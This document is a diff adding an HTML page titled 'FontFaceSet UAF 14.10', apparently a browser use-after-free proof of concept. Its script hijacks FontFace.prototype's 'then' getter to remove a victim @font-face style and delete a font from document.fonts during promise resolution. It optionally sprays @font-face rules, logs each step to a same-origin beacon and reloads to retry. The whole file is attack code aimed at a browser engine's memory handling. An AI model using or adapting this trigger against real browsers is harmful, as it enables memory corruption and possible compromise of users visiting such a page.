@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>FontFaceSet UAF 14.10</title></head>
+<body>
+<textarea id="log" readonly style="width:100%;height:300px"></textarea>
+<script>
+(function(){
+  function param(name, def) {
+    var m = (location.search || '').match(new RegExp(name + '=([0-9a-zA-Z]+)'));
+    return m ? m[1] : def;
+  }
+  var spray = parseInt(param('spray', '0'), 10);
+  var doDelete = param('del', '1') === '1';
+  var gap = parseInt(param('gap', '0'), 10);
+  var reload = param('reload', '0') === '1';
+  try {
+    var xc = new XMLHttpRequest();
+    xc.open('GET', '/corpus/ffset-config.json', false);
+    xc.send();
+    var cfg = JSON.parse(xc.responseText);
+    if (cfg.spray !== undefined) spray = cfg.spray | 0;
+    if (cfg.del !== undefined) doDelete = cfg.del ? true : false;
+    if (cfg.gap !== undefined) gap = cfg.gap | 0;
+    if (cfg.reload !== undefined) reload = cfg.reload ? true : false;
+  } catch (e) {}
+
+  function send(tag, msg) {
+    var line = 'FFSET spray=' + spray + ' del=' + (doDelete ? 1 : 0) + ' ' + tag + ' ' + msg;
+    var el = document.getElementById('log');
+    if (el) el.value += line + '\n';
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/beacon/' + tag, false);
+      x.send(line);
+    } catch (e) {}
+  }
+
+  send('BOOT', 'ua=' + navigator.userAgent);
+
+  var phase = 'control';
+  var fired = {};
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired[phase]) return undefined;
+      fired[phase] = true;
+      if (phase === 'control') {
+        send('CONTROL-GETTER', 'enter');
+        try { var s1 = document.getElementById('victim-style'); if (s1) s1.remove(); send('CONTROL-GETTER', 'style-removed'); } catch (e) { send('CONTROL-GETTER', 'style-err ' + e); }
+        try { void document.body.offsetHeight; send('CONTROL-GETTER', 'layout'); } catch (e) {}
+        send('CONTROL-GETTER', 'returning');
+        return undefined;
+      }
+      send('MAIN-GETTER', 'enter');
+      try { var s2 = document.getElementById('victim-style'); if (s2) s2.remove(); send('MAIN-GETTER', 'style-removed'); } catch (e) { send('MAIN-GETTER', 'style-err ' + e); }
+      try { void document.body.offsetHeight; send('MAIN-GETTER', 'layout'); } catch (e) {}
+      if (doDelete) {
+        try { document.fonts.delete(this); send('MAIN-GETTER', 'delete'); } catch (e) { send('MAIN-GETTER', 'delete-err ' + e); }
+      }
+      send('MAIN-GETTER', 'returning');
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  var victim = document.createElement('style');
+  victim.id = 'victim-style';
+  victim.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
+  document.head.appendChild(victim);
+  send('SETUP', 'victim-style in head');
+
+  var c = new FontFace('ctl', 'local(Arial)', { unicodeRange: 'U+0041' });
+  document.fonts.add(c);
+  c.load().then(function() { send('CONTROL', 'resolved'); }, function(e) { send('CONTROL', 'rejected ' + e); });
+  send('CONTROL', 'returned');
+
+  function main() {
+    var rv = document.getElementById('victim-style');
+    if (!rv) {
+      var again = document.createElement('style');
+      again.id = 'victim-style';
+      again.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
+      document.head.appendChild(again);
+      send('SETUP', 'victim-style re-added');
+    }
+    if (spray > 0) {
+      var rules = [];
+      for (var i = 0; i < spray; i++) {
+        rules.push('@font-face { font-family: s' + i + '; src: local(Arial); unicode-range: U+0043; }');
+      }
+      var sp = document.createElement('style');
+      sp.textContent = rules.join('\n');
+      document.head.appendChild(sp);
+      void document.body.offsetHeight;
+      send('SPRAY', 'rules=' + spray);
+    }
+    phase = 'main';
+    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    send('MAIN', 'calling document.fonts.load');
+    document.fonts.load('1em a, x', 'AB').then(function() { send('MAIN', 'resolved'); }, function(e) { send('MAIN', 'rejected ' + e); });
+    send('MAIN', 'returned-promise');
+  }
+
+  if (gap > 0) {
+    setTimeout(function() { send('PHASE', 'main'); main(); }, gap);
+  } else {
+    send('PHASE', 'main-sync');
+    main();
+  }
+  setTimeout(function() {
+    send('ALIVE', '1500ms');
+    if (reload) {
+      setTimeout(function() { try { location.reload(); } catch (e) {} }, 700);
+    }
+  }, 1500);
+})();
+</script>
+</body></html>
